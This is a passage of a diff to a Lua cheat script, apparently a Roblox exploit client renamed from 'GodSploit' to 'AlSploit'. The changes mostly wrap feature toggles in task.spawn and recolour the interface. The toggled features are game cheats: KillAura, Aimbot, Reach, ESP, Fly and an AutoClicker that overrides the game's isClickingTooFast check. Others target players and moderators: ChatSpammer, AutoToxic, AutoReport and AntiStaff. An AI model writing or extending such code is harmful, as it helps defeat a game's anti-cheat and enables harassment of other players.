-		if IsAlive(v) then
-			v.Character.Humanoid.HealthChanged:Connect(function(Health)
-				if Health <= 0 and v.Team ~= LocalPlayer.Team and v ~= LocalPlayer and Settings.AutoToxic.Value == true then
-					AutoToxic(v)
-				end
-			end)
-		end	
-
-		task.spawn(function()
-			v.CharacterAdded:Connect(function(Character)
-				task.wait(0.3)
-
-				local v = game.Players:FindFirstChild(Character.Name) or v
-
+	task.spawn(function()
+		for i, v in next, PlayerService:GetPlayers() do
+			task.spawn(function()
 				if IsAlive(v) then
 					v.Character.Humanoid.HealthChanged:Connect(function(Health)
 						if Health <= 0 and v.Team ~= LocalPlayer.Team and v ~= LocalPlayer and Settings.AutoToxic.Value == true then
 							AutoToxic(v)
 						end
 					end)
-				end
+				end	
+			end)			
+
+			task.spawn(function()
+				v.CharacterAdded:Connect(function(Character)
+					task.wait(0.3)
+
+					local v = game.Players:FindFirstChild(Character.Name) or v
+
+					if IsAlive(v) then
+						v.Character.Humanoid.HealthChanged:Connect(function(Health)
+							if Health <= 0 and v.Team ~= LocalPlayer.Team and v ~= LocalPlayer and Settings.AutoToxic.Value == true then
+								AutoToxic(v)
+							end
+						end)
+					end
+				end)
 			end)
-		end)
-	end
+		end
+	end)	
 end)
 
 task.spawn(function()
-	UserInputService.InputBegan:Connect(function(Input)
-		if Input.KeyCode == Enum.KeyCode.Space and not UserInputService:GetFocusedTextBox() then
-			FlyUp = true
-		end
+	task.spawn(function()
+		UserInputService.InputBegan:Connect(function(Input)
+			if Input.KeyCode == Enum.KeyCode.Space and not UserInputService:GetFocusedTextBox() then
+				FlyUp = true
+			end
 
-		if Input.KeyCode == Enum.KeyCode.LeftShift and not UserInputService:GetFocusedTextBox() then
-			FlyDown = true
-		end
+			if Input.KeyCode == Enum.KeyCode.LeftShift and not UserInputService:GetFocusedTextBox() then
+				FlyDown = true
+			end
+		end)
 	end)
 
-	UserInputService.InputEnded:Connect(function(Input)
-		if Input.KeyCode == Enum.KeyCode.Space and not UserInputService:GetFocusedTextBox() then
-			FlyUp = false
-		end
+	task.spawn(function()
+		UserInputService.InputEnded:Connect(function(Input)
+			if Input.KeyCode == Enum.KeyCode.Space and not UserInputService:GetFocusedTextBox() then
+				FlyUp = false
+			end
 
-		if Input.KeyCode == Enum.KeyCode.LeftShift and not UserInputService:GetFocusedTextBox() then
-			FlyDown = false
-		end
-	end)
+			if Input.KeyCode == Enum.KeyCode.LeftShift and not UserInputService:GetFocusedTextBox() then
+				FlyDown = false
+			end
+		end)
+	end)	
 end)
 
 local CombatTab = CreateTab("Combat")
@@ -3018,7 +3093,7 @@ task.spawn(function()
 					Settings.NoKnockBack.Value = not Settings.NoKnockBack.Value
 
 					if Settings.NoKnockBack.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.NoKnockBack.Value == false then
@@ -3036,17 +3111,21 @@ task.spawn(function()
 
 		local OldCpsFunction = nil
 
-		if Settings.AutoClicker.Value == true and KnitClientGotten == true then
-			SwordController.isClickingTooFast = function(self) 
-				self.lastSwing = tick()
+		task.spawn(function()
+			if Settings.AutoClicker.Value == true and KnitClientGotten == true then
+				SwordController.isClickingTooFast = function(self) 
+					self.lastSwing = tick()
 
-				return false 
+					return false 
+				end
 			end
-		end
+		end)
 
-		if Settings.AutoClicker.Value == false and KnitClientGotten == true then
-			SwordController.isClickingTooFast = OldCpsFunction
-		end
+		task.spawn(function()
+			if Settings.AutoClicker.Value == false and KnitClientGotten == true then
+				SwordController.isClickingTooFast = OldCpsFunction
+			end
+		end)	
 	end)
 
 	task.spawn(function()
@@ -3075,7 +3154,7 @@ task.spawn(function()
 					Settings.AutoClicker.Value = not Settings.AutoClicker.Value
 
 					if Settings.AutoClicker.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.AutoClicker.Value == false then
@@ -3194,7 +3273,7 @@ task.spawn(function()
 					Settings.AimAssist.Value = not Settings.AimAssist.Value
 
 					if Settings.AimAssist.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.AimAssist.Value == false then
@@ -3256,7 +3335,7 @@ task.spawn(function()
 					Settings.KillAura.Value = not Settings.KillAura.Value
 
 					if Settings.KillAura.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.KillAura.Value == false then
@@ -3356,7 +3435,7 @@ task.spawn(function()
 					Settings.Aimbot.Value = not Settings.Aimbot.Value
 
 					if Settings.Aimbot.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.Aimbot.Value == false then
@@ -3393,13 +3472,17 @@ task.spawn(function()
 
 		local OldReach = CombatConstant.RAYCAST_SWORD_CHARACTER_DISTANCE
 
-		if Settings.Reach.Value == true then
-			CombatConstant.RAYCAST_SWORD_CHARACTER_DISTANCE = 20
-		end
+		task.spawn(function()
+			if Settings.Reach.Value == true then
+				CombatConstant.RAYCAST_SWORD_CHARACTER_DISTANCE = 20
+			end
+		end)
 
-		if Settings.Reach.Value == false then
-			CombatConstant.RAYCAST_SWORD_CHARACTER_DISTANCE = OldReach
-		end
+		task.spawn(function()
+			if Settings.Reach.Value == false then
+				CombatConstant.RAYCAST_SWORD_CHARACTER_DISTANCE = OldReach
+			end
+		end)		
 	end)
 
 	task.spawn(function()
@@ -3428,7 +3511,7 @@ task.spawn(function()
 					Settings.Reach.Value = not Settings.Reach.Value
 
 					if Settings.Reach.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.Reach.Value == false then
@@ -3446,29 +3529,34 @@ task.spawn(function()
 
 		local OldSprintFunction
 
-		if Settings.Sprint.Value == true and KnitClientGotten == true then
-			OldSprintFunction = SprintController.stopSprinting
+		task.spawn(function()
+			if Settings.Sprint.Value == true and KnitClientGotten == true then
+				OldSprintFunction = SprintController.stopSprinting
 
-			SprintController.stopSprinting = function(...)
-				local Function = OldSprintFunction(...)
+				SprintController.stopSprinting = function(...)
+					local Function = OldSprintFunction(...)
 
-				SprintController:startSprinting()
-				return Function
+					SprintController:startSprinting()
+					return Function
+				end
+
+				task.spawn(function()
+					SprintController:startSprinting()
+				end)
+
+				LocalPlayer.CharacterAdded:Connect(function()
+					SprintController:stopSprinting()
+				end)
 			end
+		end)
 
-			task.spawn(function()
-				SprintController:startSprinting()
-			end)
+		task.spawn(function()
+			if Settings.Sprint.Value == false and KnitClientGotten == true then
+				SprintController.stopSprinting = OldSprintFunction
 
-			LocalPlayer.CharacterAdded:Connect(function()
 				SprintController:stopSprinting()
-			end)
-		end
-
-		if Settings.Sprint.Value == false and KnitClientGotten == true then
-			SprintController.stopSprinting = OldSprintFunction
-			SprintController:stopSprinting()
-		end
+			end
+		end)		
 	end)
 
 	task.spawn(function()
@@ -3497,7 +3585,7 @@ task.spawn(function()
 					Settings.Sprint.Value = not Settings.Sprint.Value
 
 					if Settings.Sprint.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.Sprint.Value == false then
@@ -3515,15 +3603,19 @@ task.spawn(function()
 
 		local OldCps = nil
 
-		if Settings.NoPlacementCps.Value == true then
-			OldCps = PlacementCPS.BLOCK_PLACE_CPS
+		task.spawn(function()
+			if Settings.NoPlacementCps.Value == true then
+				OldCps = PlacementCPS.BLOCK_PLACE_CPS
 
-			PlacementCPS.BLOCK_PLACE_CPS = math.huge
-		end
+				PlacementCPS.BLOCK_PLACE_CPS = math.huge
+			end
+		end)
 
-		if Settings.NoPlacementCps.Value == false then
-			PlacementCPS.BLOCK_PLACE_CPS = OldCps
-		end
+		task.spawn(function()
+			if Settings.NoPlacementCps.Value == false then
+				PlacementCPS.BLOCK_PLACE_CPS = OldCps
+			end
+		end)		
 	end)
 
 	task.spawn(function()
@@ -3552,7 +3644,7 @@ task.spawn(function()
 					Settings.NoPlacementCps.Value = not Settings.NoPlacementCps.Value
 
 					if Settings.NoPlacementCps.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.NoPlacementCps.Value == false then
@@ -3595,7 +3687,7 @@ task.spawn(function()
 					Settings.ChestStealer.Value = not Settings.ChestStealer.Value
 
 					if Settings.ChestStealer.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.ChestStealer.Value == false then
@@ -3665,7 +3757,7 @@ task.spawn(function()
 					Settings.InfiniteJump.Value = not Settings.InfiniteJump.Value
 
 					if Settings.InfiniteJump.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.InfiniteJump.Value == false then
@@ -3724,7 +3816,7 @@ task.spawn(function()
 							InfFly()
 						end)
 
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.InfiniteFly.Value == false then
@@ -3789,7 +3881,7 @@ task.spawn(function()
 							end
 						end)
 
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.HighJump.Value == false then
@@ -3832,7 +3924,7 @@ task.spawn(function()
 					Settings.SetEmote.Value = not Settings.SetEmote.Value
 
 					if Settings.SetEmote.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.SetEmote.Value == false then
@@ -4022,7 +4114,7 @@ task.spawn(function()
 					end)
 
 					if Settings.Invisible.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.Invisible.Value == false then
@@ -4065,7 +4157,7 @@ task.spawn(function()
 					Settings.Scaffold.Value = not Settings.Scaffold.Value
 
 					if Settings.Scaffold.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.Scaffold.Value == false then
@@ -4126,7 +4218,7 @@ task.spawn(function()
 					Settings.NoFall.Value = not Settings.NoFall.Value
 
 					if Settings.NoFall.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.NoFall.Value == false then
@@ -4189,7 +4281,7 @@ task.spawn(function()
 					Settings.Spider.Value = not Settings.Spider.Value
 
 					if Settings.Spider.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.Spider.Value == false then
@@ -4251,7 +4343,7 @@ task.spawn(function()
 					Settings.Speed.Value = not Settings.Speed.Value
 
 					if Settings.Speed.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.Speed.Value == false then
@@ -4313,7 +4405,7 @@ task.spawn(function()
 					Settings.Strafe.Value = not Settings.Strafe.Value
 
 					if Settings.Strafe.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.Strafe.Value == false then
@@ -4414,7 +4506,7 @@ task.spawn(function()
 							end
 						end)
 
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.Fly.Value == false then
@@ -4458,7 +4550,7 @@ task.spawn(function()
 					Settings.DamageBoost.Value = not Settings.DamageBoost.Value
 
 					if Settings.DamageBoost.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.DamageBoost.Value == false then
@@ -4501,7 +4593,7 @@ task.spawn(function()
 					Settings.ChatSpammer.Value = not Settings.ChatSpammer.Value
 
 					if Settings.ChatSpammer.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.ChatSpammer.Value == false then
@@ -4563,7 +4655,7 @@ task.spawn(function()
 					Settings.AutoReport.Value = not Settings.AutoReport.Value
 
 					if Settings.AutoReport.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.AutoReport.Value == false then
@@ -4579,19 +4671,19 @@ task.spawn(function()
 	local FpsBooster, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "FpsBooster", Settings.FpsBooster.Value, function(CallBack)
 		Settings.FpsBooster.Value = CallBack
 
-		if Settings.FpsBooster.Value == true then
-			FpsBoost()
+		task.spawn(function()
+			if Settings.FpsBooster.Value == true then
+				FpsBoost()
 
-			task.spawn(function()
-				CreateNotification(5, "GodSploit is now in balanced mode")
-			end)			
-		end
+				CreateNotification(5, "AlSploit is now in balanced mode")
+			end
+		end)	
 
-		if Settings.FpsBooster.Value == false then
-			task.spawn(function()
-				CreateNotification(5, "GodSploit is now in performance mode")
-			end)
-		end
+		task.spawn(function()
+			if Settings.FpsBooster.Value == false then
+				CreateNotification(5, "AlSploit is now in performance mode")
+			end
+		end)
 	end)
 
 	task.spawn(function()
@@ -4620,7 +4712,7 @@ task.spawn(function()
 					Settings.FpsBooster.Value = not Settings.FpsBooster.Value
 
 					if Settings.FpsBooster.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.FpsBooster.Value == false then
@@ -4663,7 +4755,7 @@ task.spawn(function()
 					Settings.PlayAgain.Value = not Settings.PlayAgain.Value
 
 					if Settings.PlayAgain.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.PlayAgain.Value == false then
@@ -4706,7 +4798,7 @@ task.spawn(function()
 					Settings.AutoToxic.Value = not Settings.AutoToxic.Value
 
 					if Settings.AutoToxic.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.AutoToxic.Value == false then
@@ -4721,16 +4813,6 @@ end)
 task.spawn(function()
 	local AutoBank, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "AutoBank", Settings.AutoBank.Value, function(CallBack)
 		Settings.AutoBank.Value = CallBack
-
-		if Settings.AutoBank.Value == false then
-			task.spawn(function()
-				CollectEnderChestItems()
-
-				task.wait(1)
-
-				CollectEnderChestItems()
-			end)
-		end
 	end)
 
 	task.spawn(function()
@@ -4759,7 +4841,7 @@ task.spawn(function()
 					Settings.AutoBank.Value = not Settings.AutoBank.Value
 
 					if Settings.AutoBank.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.AutoBank.Value == false then
@@ -4821,7 +4903,7 @@ task.spawn(function()
 					Settings.AntiStaff.Value = not Settings.AntiStaff.Value
 
 					if Settings.AntiStaff.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.AntiStaff.Value == false then
@@ -4883,7 +4965,7 @@ task.spawn(function()
 					Settings.AutoBuy.Value = not Settings.AutoBuy.Value
 
 					if Settings.AutoBuy.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.AutoBuy.Value == false then
@@ -4926,7 +5008,7 @@ task.spawn(function()
 					Settings.AutoKit.Value = not Settings.AutoKit.Value
 
 					if Settings.AutoKit.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.AutoKit.Value == false then
@@ -4942,13 +5024,17 @@ task.spawn(function()
 	local Fov, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "Fov", Settings.Fov.Value, function(CallBack)
 		Settings.Fov.Value = CallBack
 
-		if Settings.Fov.Value == true and KnitClientGotten == true then
-			FovController:setFOV(Settings.Fov.Fov)
-		end
+		task.spawn(function()
+			if Settings.Fov.Value == true and KnitClientGotten == true then
+				FovController:setFOV(Settings.Fov.Fov)
+			end
+		end)
 
-		if Settings.Fov.Value == false and KnitClientGotten == true and ClientHandlerStoreGotten then
-			FovController:setFOV(ClientHandlerStore:getState().Settings.fov)
-		end
+		task.spawn(function()
+			if Settings.Fov.Value == false and KnitClientGotten == true and ClientHandlerStoreGotten then
+				FovController:setFOV(ClientHandlerStore:getState().Settings.fov)
+			end
+		end)		
 	end)
 
 	task.spawn(function()
@@ -4977,7 +5063,7 @@ task.spawn(function()
 					Settings.Fov.Value = not Settings.Fov.Value
 
 					if Settings.Fov.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.Fov.Value == false then
@@ -5016,44 +5102,48 @@ task.spawn(function()
 	local Esp, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "Esp", Settings.Esp.Value, function(CallBack)
 		Settings.Esp.Value = CallBack
 
-		if Settings.Esp.Value == true then
-			task.spawn(function()
-				for i, v in next, PlayerService:GetPlayers() do
-					if IsAlive(v) and v ~= LocalPlayer and not v.Character.PrimaryPart:FindFirstChild("Esp") then
-						CreateOutline(v)
-					end
-
-					v.CharacterAdded:Connect(function(Character)
-						repeat task.wait() until IsAlive(PlayerService:FindFirstChild(Character.Name))
-
-
-						if Settings.Esp.Value == true and IsAlive(PlayerService:FindFirstChild(Character.Name)) and v ~= LocalPlayer and not v.Character.PrimaryPart:FindFirstChild("Esp") then
+		task.spawn(function()
+			if Settings.Esp.Value == true then
+				task.spawn(function()
+					for i, v in next, PlayerService:GetPlayers() do
+						if IsAlive(v) and v ~= LocalPlayer and not v.Character.PrimaryPart:FindFirstChild("Esp") then
 							CreateOutline(v)
 						end
-					end)
-				end
-			end)
 
-			task.spawn(function()
-				PlayerService.PlayerAdded:Connect(function(Player)
-					Player.CharacterAdded:Connect(function()
-						repeat task.wait() until IsAlive(Player)
+						v.CharacterAdded:Connect(function(Character)
+							repeat task.wait() until IsAlive(PlayerService:FindFirstChild(Character.Name))
 
-						if Settings.Esp.Value == true and IsAlive(Player) and Player ~= LocalPlayer and not Player.Character.PrimaryPart:FindFirstChild("Esp") then
-							CreateOutline(Player)
-						end
+
+							if Settings.Esp.Value == true and IsAlive(PlayerService:FindFirstChild(Character.Name)) and v ~= LocalPlayer and not v.Character.PrimaryPart:FindFirstChild("Esp") then
+								CreateOutline(v)
+							end
+						end)
+					end
+				end)
+
+				task.spawn(function()
+					PlayerService.PlayerAdded:Connect(function(Player)
+						Player.CharacterAdded:Connect(function()
+							repeat task.wait() until IsAlive(Player)
+
+							if Settings.Esp.Value == true and IsAlive(Player) and Player ~= LocalPlayer and not Player.Character.PrimaryPart:FindFirstChild("Esp") then
+								CreateOutline(Player)
+							end
+						end)
 					end)
 				end)
-			end)
-		end
+			end
+		end)
 
-		if Settings.Esp.Value == false then
-			for i, v in next, PlayerService:GetPlayers() do
-				if IsAlive(v) and CallBack == false and v.Character.PrimaryPart:FindFirstChild("Esp") then
-					v.Character.PrimaryPart:FindFirstChild("Esp"):Destroy()
+		task.spawn(function()
+			if Settings.Esp.Value == false then
+				for i, v in next, PlayerService:GetPlayers() do
+					if IsAlive(v) and v.Character.PrimaryPart:FindFirstChild("Esp") then
+						v.Character.PrimaryPart:FindFirstChild("Esp"):Destroy()
+					end
 				end
 			end
-		end
+		end)		
 	end)
 
 	task.spawn(function()
@@ -5110,20 +5200,20 @@ task.spawn(function()
 							end)
 						end)
 
-						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
